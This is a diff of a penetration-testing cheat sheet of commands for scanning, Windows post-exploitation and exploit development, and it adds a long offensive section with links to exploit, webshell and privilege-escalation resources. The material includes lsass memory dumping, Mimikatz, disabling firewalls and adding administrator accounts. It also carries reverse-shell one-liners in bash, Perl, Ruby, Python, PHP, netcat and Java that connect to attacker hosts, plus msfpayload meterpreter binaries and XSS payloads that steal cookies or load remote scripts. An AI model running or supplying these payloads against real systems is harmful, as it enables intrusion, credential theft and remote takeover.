@@ -1,10 +1,11 @@
-**Nmap Full Web Vulnerable Scan:**
+**Nmap Full Web Vulnerable Scan:  
+**
 
 mkdir /usr/share/nmap/scripts/vulscan
 
 cd /usr/share/nmap/scrripts/vulscan
 
-wget http://www.computec.ch/projekte/vulscan/download/nmap\_nse\_vulscan-2.0.tar.gz && tar xzf nmap\_nse\_vulscan-2.0.tar.gz
+wget [http://www.computec.ch/projekte/vulscan/download/nmap\_nse\_vulscan-2.0.tar.gz](http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz) && tar xzf nmap\_nse\_vulscan-2.0.tar.gz
 
 nmap -sS -sV –script=vulscan/vulscan.nse target
 
@@ -20,31 +21,36 @@ nmap -PN -sS -sV –script=all –script-args vulscancorrelation=1 target
 
 **Dirb Directory Bruteforce:**
 
-dirb http://IP:PORT dirbuster-ng-master/wordlists/common.txt
+dirb [http://IP:PORT](http://IP:PORT) dirbuster-ng-master/wordlists/common.txt
 
-**Nikto Scanner:**
+**Nikto Scanner:  
+**
 
-nikto -C all -h http://IP
+nikto -C all -h [http://IP](http://IP)
 
-**WordPress Scanner:**
+**WordPress Scanner:  
+**
 
-wpscan –url http://IP/ –enumerate p
+wpscan –url [http://IP/](http://IP/) –enumerate p
 
-**Uniscan Scanning:**
+**Uniscan Scanning:  
+**
 
 uniscan.pl -u target -qweds
 
 **HTTP Enumeration:**
 
-httprint -h http://www.example.com -s signatures.txt
+httprint -h [http://www.example.com](http://www.example.com) -s signatures.txt
 
-**SKIP Fish Scanner:**
+**SKIP Fish Scanner:  
+**
 
-skipfish -m 5 -LVY -W /usr/share/skipfish/dictionaries/complete.wl -u http://IP
+skipfish -m 5 -LVY -W /usr/share/skipfish/dictionaries/complete.wl -u [http://IP](http://IP)
 
-**Uniscan Scanning:**
+**Uniscan Scanning:  
+**
 
-uniscan –u http://www.hubbardbrook.org –qweds
+uniscan –u [http://www.hubbardbrook.org](http://www.hubbardbrook.org) –qweds
 
 Here, -q – Enable Directory checks
 
@@ -56,13 +62,15 @@ Here, -q – Enable Directory checks
 
 -s – Enable Static checks
 
-**Skipfish Scanning:**
+**Skipfish Scanning:  
+**
 
 m-time threads -LVY donot update after result
 
-skipfish -m 5 -LVY -W /usr/share/skipfish/dictionaries/complete.wl -u http://IP
+skipfish -m 5 -LVY -W /usr/share/skipfish/dictionaries/complete.wl -u [http://IP](http://IP)
 
-**Nmap Ports Scan:**
+**Nmap Ports Scan:  
+**
 
 1\)decoy- masqurade nmap -D RND:10 \[target\] \(Generates a random number of decoys\)
 
@@ -94,17 +102,20 @@ nmap -sU -P0 \(Udp\)
 
 nmap -sC 192.168.31.10-12 \(all scan default\)
 
-**Netcat Scanning:**
+**Netcat Scanning:  
+**
 
 nc -v -w 1 target -z 1-1000
 
 for i in {10..12}; do nc -vv -n -w 1 192.168.34.$i 21-25 -z; done
 
-**US Scanning:**
+**US Scanning:  
+**
 
 us -H -msf -Iv 192.168.31.20 -p 1-65535 && us -H -mU -Iv 192.168.31.20 -p 1-65535
 
-**Unicornscan Scanning:**
+**Unicornscan Scanning:  
+**
 
 unicornscan X.X.X.X:a -r10000 -v
 
@@ -112,7 +123,8 @@ unicornscan X.X.X.X:a -r10000 -v
 
 xprobe2 -v -p tcp:80:open 192.168.6.66
 
-**Samba Enumeartion:**
+**Samba Enumeartion:  
+**
 
 nmblookup -A target
 
@@ -122,7 +134,8 @@ rpcclient -U “” target
 
 enum4linux target
 
-**SNMP Enumeration:**
+**SNMP Enumeration:  
+**
 
 snmpget -v 1 -c public IP version
 
@@ -130,7 +143,7 @@ snmpwalk -v 1 -c public IP
 
 snmpbulkwalk -v 2 -c public IP
 
-Windows Useful commands:
+**Windows Useful commands:**
 
 net localgroup Users
 
@@ -154,13 +167,11 @@ C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
 
 C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits
 
-Plink Tunnel:
+**Plink Tunnel**:
 
 plink.exe -P 22 -l root -pw “1234” -R 445:127.0.0.1:445 X.X.X.X
 
-
-
-Enable RDP Access:
+**Enable RDP Access:**
 
 reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG\_DWORD /d 0
 
@@ -168,23 +179,23 @@ netsh firewall set service remoteadmin enable
 
 netsh firewall set service remotedesktop enable
 
-Turn Off Firewall:
+**Turn Off Firewall:**
 
 netsh firewall set opmode disable
 
-Meterpreter:
+**Meterpreter:**
 
 run getgui -u admin -p 1234
 
 run vnc -p 5043
 
-Add User Windows:
+**Add User Windows:**
 
 net user test 1234 /add
 
 net localgroup administrators test /add
 
-Mimikatz:
+**Mimikatz:**
 
 privilege::debug
 
@@ -198,7 +209,7 @@ Password Cracking using Hashcat:
 
 hashcat -m 400 -a 0 hash /root/rockyou.txt
 
-Netcat commands:
+**Netcat commands:**
 
 c:&gt; nc -l -p 31337
 
@@ -208,7 +219,7 @@ c:&gt; nc -v -w 30 -p 31337 -l &lt; secret.txt
 
 \#nc -v -w 2 192.168.0.10 31337 &gt; secret.txt
 
-Banner Grabbing:
+**Banner Grabbing:**
 
 nc 192.168.0.10 80
 
@@ -224,7 +235,7 @@ Referrer: K0NSP1RACY.COM
 
 &lt;enter&gt;
 
-window reverse shell:
+**window reverse shell:**
 
 c:&gt;nc -Lp 31337 -vv -e cmd.exe
 
@@ -240,11 +251,11 @@ nc 192.168.0.11 31337
 
 nc -vv -r\(random\) -w\(wait\) 1 192.168.0.10 -z\(i/o error\) 1-1000
 
-Find all SUID root files:
+**Find all SUID root files:**
 
 find / -user root -perm -4000 -print
 
-Find all SGID root files:
+**Find all SGID root files:**
 
 find / -group root -perm -2000 -print
 
@@ -252,39 +263,39 @@ Find all SUID and SGID files owned by anyone:
 
 find / -perm -4000 -o -perm -2000 -print
 
-Find all files that are not owned by any user:
+**Find all files that are not owned by any user:**
 
 find / -nouser -print
 
-Find all files that are not owned by any group:
+**Find all files that are not owned by any group:**
 
 find / -nogroup -print
 
-Find all symlinks and what they point to:
+**Find all symlinks and what they point to:**
 
 find / -type l -ls
 
-Python:
+**Python:**
 
 python -c ‘import pty;pty.spawn\(“/bin/bash”\)’
 
 python -m SimpleHTTPServer \(Starting HTTP Server\)
 
-PID:
+**PID:**
 
 fuser -nv tcp 80 \(list PID of process\)
 
 fuser -k -n tcp 80 \(Kill Process of PID\)
 
-Hydra:
+**Hydra:**
 
 hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp \(Self Explanatory\)
 
-Mount Remote Windows Share:
+**Mount Remote Windows Share**:
 
 smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
 
-Compiling Exploit in Kali:
+**Compiling Exploit in Kali:**
 
 gcc -m32 -o output32 hello.c \(32 bit\)
 
@@ -298,13 +309,13 @@ wine gcc -o ability.exe /tmp/exploit.c -lwsock32
 
 wine ability.exe
 
-NASM Command:
+**NASM Command:**
 
 nasm -f bin -o payload.bin payload.asm
 
 nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload
 
-SSH Pivoting:
+**SSH Pivoting:**
 
 ssh -D 127.0.0.1:1080 -p 22 user@IP
 
@@ -312,7 +323,7 @@ Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
 
 proxychains commands target
 
-Pivoting to One Network to Another:
+**Pivoting to One Network to Another:**
 
 ssh -D 127.0.0.1:1080 -p 22 user1@IP1
 
@@ -324,7 +335,7 @@ Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
 
 proxychains commands target
 
-Pivoting Using metasploit:
+**Pivoting Using metasploit:**
 
 route add 10.1.1.0 255.255.255.0 1
 
@@ -336,7 +347,7 @@ run
 
 proxychains msfcli windows/\* PAYLOAD=windows/meterpreter/reverse\_tcp LHOST=IP LPORT=443 RHOST=IP E
 
-Exploit-DB search using CSV File:
+**Exploit-DB search using CSV File:**
 
 searchsploit-rb –update
 
@@ -350,11 +361,11 @@ searchsploit-rb -t remote -s “exploit name”
 
 searchsploit-rb -p linux -t local -s “exploit name”
 
-For Privilege Escalation Exploit search:
+**For Privilege Escalation Exploit search:**
 
 cat files.csv \| grep -i linux \| grep -i kernel \| grep -i local \| grep -v dos \| uniq \| grep 2.6 \| egrep “&lt;\|&lt;=” \| sort -k3
 
-Metasploit Payloads:
+**Metasploit Payloads:**
 
 msfpayload windows/meterpreter/reverse\_tcp LHOST=10.10.10.10 X &gt; system.exe
 
@@ -394,7 +405,7 @@ Create a Windows Reverse Meterpreter Binary
 
 msfpayload windows/meterpreter/reverse\_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; X &gt;shell.exe
 
-Security Commands In Linux:
+**Security Commands In Linux:**
 
 find programs with a set uid bit
 
@@ -498,7 +509,7 @@ add garbage upto EIP value and add \(JMP ESP address\) in EIP . \(ESP = shellcod
 
 !mona suggest
 
-SEH:
+**SEH:**
 
 !mona suggest
 
@@ -508,7 +519,7 @@ nseh=”\xeb\x06\x90\x90″ \(next seh chain\)
 
 iseh= !pvefindaddr p1 -n -o -i \(POP POP RETRUN or POPr32,POPr32,RETN\)
 
-ROP \(DEP\):
+**ROP \(DEP\):**
 
 !mona modules
 
@@ -516,7 +527,7 @@ ROP \(DEP\):
 
 !mona rop -m \*.dll -cpb “\x00\x09\x0a’ \(auto suggest\)
 
-ASLR:
+**ASLR:**
 
 !mona noaslr
 
@@ -534,7 +545,7 @@ buff=lxxllxxl+shell
 
 GDB Debugger Commands:
 
-Setting Breakpoint :
+**Setting Breakpoint :**
 
 break \*\_start
 
@@ -548,13 +559,13 @@ n
 
 s
 
-Continue Execution :
+**Continue Execution :**
 
 continue
 
 c
 
-Data :
+**Data :**
 
 checking ‘REGISTERS’ and ‘MEMORY’
 
@@ -592,11 +603,11 @@ y –&gt; Format for output ==&gt; c \(character\) , d \(decimal\) , x \(Hexadec
 
 z –&gt; Size of field to be displayed ==&gt; b \(byte\) , h \(halfword\), w \(word 32 Bit\)
 
-Cheat Codes:
+**Cheat Codes:**
 
-Reverse Shellcode:
+**Reverse Shellcode:**
 
-BASH:
+**BASH:**
 
 bash -i &gt;& /dev/tcp/192.168.23.10/443 0&gt;&1
 
@@ -620,7 +631,473 @@ while read line 0&lt;&5; do $line 2&gt;&5 &gt;&5; done
 
 /bin/bash -i &gt; /dev/tcp/192.168.23.10/443 0&lt;&1 2&gt;&1
 
+**PERL:**
 
+Shorter Perl reverse shell that does not depend on /bin/sh:
+
+perl -MIO -e ‘$p=fork;exit,if\($p\);$c=new IO::Socket::INET\(PeerAddr,”attackerip:4444″\);STDIN-&gt;fdopen\($c,r\);$~-&gt;fdopen\($c,w\);system$\_ while&lt;&gt;;’
+
+perl -MIO -e ‘$p=fork;exit,if\($p\);$c=new IO::Socket::INET\(PeerAddr,”attackerip:4444″\);STDIN-&gt;fdopen\($c,r\);$~-&gt;fdopen\($c,w\);system$\_ while&lt;&gt;;’
+
+If the target system is running Windows use the following one-liner:
+
+perl -MIO -e ‘$c=new IO::Socket::INET\(PeerAddr,”attackerip:4444″\);STDIN-&gt;fdopen\($c,r\);$~-&gt;fdopen\($c,w\);system$\_ while&lt;&gt;;’
+
+perl -MIO -e ‘$c=new IO::Socket::INET\(PeerAddr,”attackerip:4444″\);STDIN-&gt;fdopen\($c,r\);$~-&gt;fdopen\($c,w\);system$\_ while&lt;&gt;;’
+
+perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket\(S,PF\_INET,SOCK\_STREAM,getprotobyname\(“tcp”\)\);if\(connect\(S,sockaddr\_in\($p,inet\_aton\($i\)\)\)\){open\(STDIN,”&gt;&S”\);open\(STDOUT,”&gt;&S”\);open\(STDERR,”&gt;&S”\);exec\(“/bin/sh -i”\);};’
+
+perl -e ‘use Socket;$i=”10.0.0.1″;$p=1234;socket\(S,PF\_INET,SOCK\_STREAM,getprotobyname\(“tcp”\)\);if\(connect\(S,sockaddr\_in\($p,inet\_aton\($i\)\)\)\){open\(STDIN,”&gt;&S”\);open\(STDOUT,”&gt;&S”\);open\(STDERR,”&gt;&S”\);exec\(“/bin/sh -i”\);};’
+
+**RUBY:**
+
+Longer Ruby reverse shell that does not depend on /bin/sh:
+
+ruby -rsocket -e ‘exit if fork;c=TCPSocket.new\(“attackerip”,”4444″\);while\(cmd=c.gets\);IO.popen\(cmd,”r”\){\|io\|c.printio.read}end’
+
+ruby -rsocket -e ‘exit if fork;c=TCPSocket.new\(“attackerip”,”4444″\);while\(cmd=c.gets\);IO.popen\(cmd,”r”\){\|io\|c.printio.read}end’
+
+If the target system is running Windows use the following one-liner:
+
+ruby -rsocket -e ‘c=TCPSocket.new\(“attackerip”,”4444″\);while\(cmd=c.gets\);IO.popen\(cmd,”r”\){\|io\|c.print io.read}end’
+
+ruby -rsocket -e ‘c=TCPSocket.new\(“attackerip”,”4444″\);while\(cmd=c.gets\);IO.popen\(cmd,”r”\){\|io\|c.print io.read}end’
+
+ruby -rsocket -e’f=TCPSocket.open\(“attackerip”,1234\).to\_i;exec sprintf\(“/bin/sh -i &lt;&%d &gt;&%d 2&gt;&%d”,f,f,f\)’
+
+ruby -rsocket -e’f=TCPSocket.open\(“attackerip”,1234\).to\_i;exec sprintf\(“/bin/sh -i &lt;&%d &gt;&%d 2&gt;&%d”,f,f,f\)’
+
+**PYTHON:**
+
+python -c ‘import socket,subprocess,os;s=socket.socket\(socket.AF\_INET,socket.SOCK\_STREAM\);s.connect\(\(“10.0.0.1″,1234\)\);os.dup2\(s.fileno\(\),0\);os.dup2\(s.fileno\(\),1\); os.dup2\(s.fileno\(\),2\);p=subprocess.call\(\[“/bin/sh”,”-i”\]\);’
+
+python -c ‘import socket,subprocess,os;s=socket.socket\(socket.AF\_INET,socket.SOCK\_STREAM\);s.connect\(\(“10.0.0.1″,1234\)\);os.dup2\(s.fileno\(\),0\);os.dup2\(s.fileno\(\),1\); os.dup2\(s.fileno\(\),2\);p=subprocess.call\(\[“/bin/sh”,”-i”\]\);’
+
+**PHP:**
+
+This code assumes that the TCP connection uses file descriptor 3.
+
+php -r ‘$sock=fsockopen\(“10.0.0.1″,1234\);exec\(“/bin/sh -i &lt;&3 &gt;&3 2&gt;&3″\);’
+
+php -r ‘$sock=fsockopen\(“10.0.0.1″,1234\);exec\(“/bin/sh -i &lt;&3 &gt;&3 2&gt;&3″\);’
+
+If you would like a PHP reverse shell to download, try this link on pentestmonkey.net -&gt; LINK
+
+**NETCAT:**
+
+Other possible Netcat reverse shells, depending on the Netcat version and compilation flags:
+
+nc -e /bin/sh attackerip 4444
+
+nc -e /bin/sh 192.168.37.10 443
+
+If the -e option is disabled, try this
+
+mknod backpipe p && nc 192.168.23.10 443 0&lt;backpipe \| /bin/bash 1&gt;backpipe
+
+mknod backpipe p && nc attackerip 8080 0&lt;backpipe \| /bin/bash 1&gt;backpipe
+
+/bin/sh \| nc attackerip 4444
+
+/bin/sh \| nc 192.168.23.10 443
+
+rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/
+
+rm -f /tmp/p; mknod /tmp/p p && nc 192.168.23.10 444 0/tmp/
+
+If you have the wrong version of netcat installed, try
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2&gt;&1\|nc 192.168.23.10 &gt;/tmp/f
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2&gt;&1\|nc 10.0.0.1 1234 &gt;/tmp/f
+
+**TELNET:**
+
+If netcat is not available or /dev/tcp
+
+mknod backpipe p && telnet attackerip 8080 0&lt;backpipe \| /bin/bash 1&gt;backpipe
+
+mknod backpipe p && telnet attackerip 8080 0&lt;backpipe \| /bin/bash 1&gt;backpipe
+
+**XTERM:**
+
+Xterm is the best..
+
+To catch incoming xterm, start an open X Server on your system \(:1 – which listens on TCP port 6001\). One way to do this is with Xnest: It is available on Ubuntu.
+
+Xnest :1 \# Note: The command starts with uppercase X
+
+Xnest :1 \# Note: The command starts with uppercase X
+
+Then remember to authorise on your system the target IP to connect to you:
+
+xterm -display 127.0.0.1:1 \# Run this OUTSIDE the Xnest, another tab xhost +targetip \# Run this INSIDE the spawned xterm on the open X Server
+
+xterm -display 127.0.0.1:1 \# Run this OUTSIDE the Xnest, another tab
+
+xhost +targetip \# Run this INSIDE the spawned xterm on the open X Server
+
+If you want anyone to connect to this spawned xterm try:
+
+xhost + \# Run this INSIDE the spawned xterm on the open X Server
+
+xhost + \# Run this INSIDE the spawned xterm on the open X Server
+
+Then on the target, assuming that xterm is installed, connect back to the open X Server on your system:
+
+xterm -display attackerip:1
+
+xterm -display attackerip:1
+
+Or:
+
+$ DISPLAY=attackerip:0 xterm
+
+$ DISPLAY=attackerip:0 xterm
+
+It will try to connect back to you, attackerip, on TCP port 6001.
+
+Note that on Solaris xterm path is usually not within the PATH environment variable, you need to specify its filepath:
+
+/usr/openwin/bin/xterm -display attackerip:1
+
+/usr/openwin/bin/xterm -display attackerip:1
+
+**PHP:**
+
+php -r ‘$sock=fsockopen\(“192.168.0.100″,4444\);exec\(“/bin/sh -i &lt;&3 &gt;&3 2&gt;&3″\);’
+
+**JAVA:**
+
+r = Runtime.getRuntime\(\)
+
+p = r.exec\(\[“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.0.100/4444;cat &lt;&5 \| while read line; do \$line 2&gt;&5 &gt;&5; done”\] as String\[\]\)
+
+p.waitFor\(\)
+
+XSS Cheat Codes:
+
+\(“&lt; iframes &gt;  src=http://IP:PORT &lt;/ iframes &gt;”\)
+
+&lt;script&gt;document.location=http://IP:PORT&lt;/script&gt;
+
+‘;alert\(String.fromCharCode\(88,83,83\)\)//\';alert\(String.fromCharCode\(88,83,83\)\)//”;alert\(String.fromCharCode\(88,83,83\)\)//\”;alert\(String.fromCharCode\(88,83,83\)\)//–&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert\(String.fromCharCode\(88,83,83\)\)&lt;/SCRIPT&gt;
+
+”;!–“&lt;XSS&gt;=&amp;amp;{\(\)}
+
+&lt;IMG SRC=”javascript:alert\(‘XSS’\);”&gt;
+
+&lt;IMG SRC=javascript:alert\(‘XSS’\)&gt;
+
+&lt;IMG “””&gt;&lt;SCRIPT&gt;alert\(“XSS”\)&lt;/SCRIPT&gt;”&gt;
+
+&lt;IMG SRC=&amp;amp;\#106;&amp;amp;\#97;&amp;amp;\#118;&amp;amp;\#97;&amp;amp;\#115;&amp;amp;\#99;&amp;amp;\#114;&amp;amp;\#105;&amp;amp;\#112;&amp;amp;\#116;&amp;amp;\#58;&amp;amp;\#97;&amp;amp;\#108;&amp;amp;\#101;&amp;amp;\#114;&amp;amp;\#116;&amp;amp;\#40;&amp;amp;\#39;&amp;amp;\#88;&amp;amp;\#83;&amp;amp;\#83;&amp;amp;\#39;&amp;amp;\#41;&gt;
+
+&lt;IMG SRC=&amp;amp;\#0000106&amp;amp;\#0000097&amp;amp;\#0000118&amp;amp;\#0000097&amp;amp;\#0000115&amp;amp;\#0000099&amp;amp;\#0000114&amp;amp;\#0000105&amp;amp;\#0000112&amp;amp;\#0000116&amp;amp;\#0000058&amp;amp;\#0000097&amp;amp;\#0000108&amp;amp;\#0000101&amp;amp;\#0000114&amp;amp;\#0000116&amp;amp;\#0000040&amp;amp;\#0000039&amp;amp;\#0000088&amp;amp;\#0000083&amp;amp;\#0000083&amp;amp;\#0000039&amp;amp;\#0000041&gt;
+
+&lt;IMG SRC=”jav ascript:alert\(‘XSS’\);”&gt;
+
+perl -e ‘print “&lt;IMG SRC=javascript:alert\(\”XSS\”\)&gt;”;’ &gt; out
+
+&lt;BODY onload!\#$%&amp;\(\)\*~+-\_.,:;?@\[/\|\\]^\`=alert\(“XSS”\)&gt;
+
+\( “&gt;&lt; iframes http://google.de &lt; iframes &gt;\)
+
+&lt;BODY BACKGROUND=”javascript:alert\(‘XSS’\)”&gt;
+
+&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert\(‘XSS’\);”&gt;&lt;/FRAMESET&gt;
+
+“&gt;&lt;script &gt;alert\(document.cookie\)&lt;/script&gt;
+
+%253cscript%253ealert\(document.cookie\)%253c/script%253e
+
+“&gt;&lt;s”%2b”cript&gt;alert\(document.cookie\)&lt;/script&gt;
+
+%22/%3E%3CBODY%20onload=’document.write\(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22\)’%3E
+
+&lt;img src=asdf onerror=alert\(document.cookie\)&gt;
+
+Useful Links To Read and Learn:
+
+Enumeration:
+
+http://www.0daysecurity.com/penetration-testing/enumeration.html
+
+Windows Shellcode:
+
+http://farlight.org/index.html?type=shellcode
+
+http://shell-storm.org/shellcode/
+
+http://www.windowsexploits.com/
+
+**XSS Cheat Codes:**
+
+http://www.xenuser.org/xss-cheat-sheet/
+
+https://gist.github.com/sseffa/11031135
+
+https://html5sec.org/
+
+Reverse Shell Cheat Codes:
+
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+http://roo7break.co.uk/?p=215
+
+**Webshells:**
+
+http://www.r57shell.net/
+
+**Nikto Tutorial:**
+
+http://www.unixmen.com/install-nikto-web-scanner-check-vulnerabilities/
+
+**Exploit-db:**
+
+wget http://exploit-db.com/archive.tar.bz2
+
+**SNMP Enumeration:**
+
+http://www.webpronews.com/snmp-enumeration-and-hacking-2003-09
+
+http://carnal0wnage.attackresearch.com/2007/07/over-in-lso-chat-we-were-talking-about.html
+
+**SAMBA Enumeration:**
+
+http://www.iodigitalsec.com/windows-null-session-enumeration/
+
+http://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions
+
+http://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html
+
+http://www.madirish.net/59
+
+**Passhing The Hash:**
+
+https://www.kali.org/penetration-testing/passing-hash-remote-desktop/
+
+https://www.kali.org/kali-monday/pass-the-hash-toolkit-winexe-updates/
+
+**Hashcat Tutorial:**
+
+http://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-3-using-hashcat-0156543/
+
+**Wordlist Download:**
+
+https://wiki.skullsecurity.org/Passwords
+
+http://hqsoftwarecollection.blogspot.in/p/36gn-wordlist.html
+
+**NASM Tutorial:**
+
+http://en.kioskea.net/faq/1559-compiling-an-assembly-program-with-nasm
+
+**Buffer overflow Tutorial:**
+
+I consider this as intermediate and focus more on the real application exploit. Lupin from The Grey Corner explains exploit from basic to intermediate level with step by step debugging.
+
+Stack Based Windows Buffer Overflow Tutorial – http://grey-corner.blogspot.com/2010/01/beginning-stack-based-buffer-overflow.html
+
+SEH Stack Based Windows Buffer Overflow Tutorial – http://grey-corner.blogspot.com/2010/01/seh-stack-based-windows-buffer-overflow.html
+
+Windows Buffer Overflow Tutorial: Dealing with Character Translation – http://grey-corner.blogspot.com/2010/01/windows-buffer-overflow-tutorial.html
+
+Heap Spray Exploit Tutorial: Internet Explorer Use After Free Aurora Vulnerability – http://grey-corner.blogspot.com/2010/01/heap-spray-exploit-tutorial-internet.html
+
+Windows Buffer Overflow Tutorial: An Egghunter and a Conditional Jump – http://grey-corner.blogspot.com/2010/02/windows-buffer-overflow-tutorial.html
+
+**ADVANCED:**
+
+Peter Van Eeckhoutte is the first one who started this exploit tutorial \(at least he is the first one who has provided most comprehensive guides on exploit development and keeps updating from time to time that I have ever seen\).
+
+Exploit writting tutorial part 1:Stack Based Overflows –http://www.corelan.be:8800/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
+
+Exploit writting tutorial part 2: Stack Based Overflows – jumping to shellcode –http://www.corelan.be:8800/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/
+
+Exploit writting tutorial part 3: SEH Based Exploits –http://www.corelan.be:8800/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/
+
+Exploit writting tutorial part 3b: SEH Based Exploits – just another example –http://www.corelan.be:8800/index.php/2009/07/28/seh-based-exploit-writing-tutorial-continued-just-another-example-part-3b/
+
+Exploit writting tutorial part 4: From Exploit to Metasploit – The basics –http://www.corelan.be:8800/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/
+
+Exploit writting tutorial part 5: How debugger modules & plugins can speed up basic exploit development – http://www.corelan.be:8800/index.php/2009/09/05/exploit-writing-tutorial-part-5-how-debugger-modules-plugins-can-speed-up-basic-exploit-development/
+
+Exploit writting tutorial part 6: Bypassing Stack Cookies, SafeSeh, SEHOP, HW DEP and ASLR –http://www.corelan.be:8800/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/
+
+Exploit writting tutorial part 7: Unicode – from 0x00410041 to calc –http://www.corelan.be:8800/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/
+
+Exploit writting tutorial part 8: Win32 Egg Hunting –http://www.corelan.be:8800/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
+
+Exploit writting tutorial part 9: Introduction to Win32 shellcoding –http://www.corelan.be:8800/index.php/2010/02/25/exploit-writing-tutorial-part-9-introduction-to-win32-shellcoding/
+
+
+
+**SQL Injection Cheat Codes:**
+
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+
+http://resources.infosecinstitute.com/backdoor-sql-injection/
+
+**RFI/LFI Tutorials:**
+
+https://evilzone.org/tutorials/remote-file-inclusion%28rfi%29/
+
+http://www.hackersonlineclub.com/lfi-rfi
+
+https://0xzoidberg.wordpress.com/category/security/lfi-rfi/
+
+**NMAP Vulsan:**
+
+http://www.computec.ch/projekte/vulscan/download/nmap\_nse\_vulscan-2.0.tar.gz
+
+**Online Hash Cracking:**
+
+http://www.objectif-securite.ch/
+
+Dump Windows Password Hashes:
+
+http://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html
+
+**Windows Previlige Escalation:**
+
+http://it-ovid.blogspot.in/2012/02/windows-privilege-escalation.html
+
+http://www.fuzzysecurity.com/tutorials/16.html
+
+**Linux Previlige Escalation:**
+
+http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation.html
+
+http://pentestmonkey.net/tools/audit/unix-privesc-check
+
+http://www.rebootuser.com/?p=1758
+
+**Tunneling & Port Forwarding:**
+
+http://magikh0e.ihtb.org/pubPapers/ssh\_gymnastics\_tunneling.html \(Very Good\)
+
+http://www.debianadmin.com/howto-use-ssh-local-and-remote-port-forwarding.html
+
+http://www.danscourses.com/Network-Penetration-Testing/metasploit-pivoting.html
+
+http://carnal0wnage.attackresearch.com/2007/09/using-metasploit-to-pivot-through\_06.html
+
+http://www.offensive-security.com/metasploit-unleashed/Portfwd
+
+http://www.offensive-security.com/metasploit-unleashed/Pivoting
+
+http://www.howtoforge.com/reverse-ssh-tunneling 
+
+http://ftp.acc.umu.se/pub/putty/putty-0.57/htmldoc/Chapter7.html \(Plink\)
+
+http://www.offensive-security.com/metasploit-unleashed/Msfvenom
+
+**Useful Links:**
+
+http://www.fuzzysecurity.com/tutorials.html – Exploit tutorials
+
+https://www.corelan.be/index.php/articles/ – Exploit tutorials
+
+http://www.securitytube.net/ – Training videos
+
+http://www.offensive-security.com/blog/ – Offensive Security blog
+
+http://blog.g0tmi1k.com/ – Security blog
+
+http://carnal0wnage.attackresearch.com
+
+http://cybershakti.my3gb.com/
+
+http://www.offensive-security.com/metasploit-unleashed/Introduction
+
+http://www.securityfocus.com/
+
+http://www.exploit-db.com/
+
+http://nmap.org/nsedoc/
+
+http://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
+
+http://www.fuzzysecurity.com/tutorials/16.html
+
+http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html
+
+http://incolumitas.com/wp-content/uploads/2012/12/blackhats\_view.pdf
+
+http://pentestmonkey.net/tools/audit/unix-privesc-check
+
+http://pentestmonkey.net/tools/windows-privesc-check
+
+**Videos:**
+
+http://www.securitytube.net/
+
+http://www.rmccurdy.com/scripts/videos/ \(milliworm exploit tutorial\)
+
+http://www.cs.fsu.edu/~redwood/OffensiveSecurity/lectures.html \(Offensive Secuirty Lectures\)
+
+**Privilege Escalation in Windows**:
+
+http://www.youtube.com/watch?v=kMG8IsCohHA Encyclopaedia Of Windows Privilege Escalation – Brett Moore
+
+http://www.youtube.com/watch?v=\_8xJaaQlpBo DerbyCon 3 0 2105 Windows Attacks At Is The New Black Rob Fuller And Chris Gates
+
+http://www.greyhathacker.net/?p=738 Elevating privileges by exploiting weak folder permissions
+
+**Buffer Overflow Tutorial:**
+
+http://www.frequency.com/video/athcon-hack-in-paris-demo-1/40181156
+
+http://www.savevid.com/video/athcon-hack-in-paris-demo-2.html
+
+http://www.frequency.com/video/athcon-hack-in-paris-demo-3/11306148
+
+https://www.youtube.com/watch?v=ANlROJNWtCs&list=PLM0IiVYClP2vC3A6Uz\_ESV86kBVYei5qx\(Python Penetration Testing\)
+
+https://www.youtube.com/watch?v=Sye3mu-EoTI \(Bash Scripting by Peter Chubb\)
+
+https://www.youtube.com/watch?v=GPjcSxyIIUc \(BASH Scripting by Lee Baird \)
+
+https://www.youtube.com/watch?v=kPxavpgos2I \(LFI/RFI\)
+
+https://www.youtube.com/watch?v=pnqcHU2qFiA \(LFI/RFI\)
+
+http://www.securitytube.net/video/7640 \(Simple buffer overflow\)
+
+https://www.youtube.com/watch?v=y2zrEAwmdws \(Mona.py\)
+
+http://www.securitytube.net/video/7735 \(Avoiding bad characters\)
+
+**PDF:**
+
